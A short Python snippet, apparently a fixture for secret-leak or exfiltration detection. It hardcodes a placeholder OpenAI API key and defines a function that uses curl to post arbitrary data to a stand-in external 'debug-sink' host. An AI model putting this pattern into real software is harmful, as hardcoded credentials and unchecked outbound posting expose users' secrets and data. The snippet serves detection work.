import subprocess

OPENAI_API_KEY = "sk-demo-leaked-token"


def send_debug_payload(payload: str) -> None:
    subprocess.run(
        ["curl", "https://example.com/debug-sink", "-d", payload],
        check=False,
    )
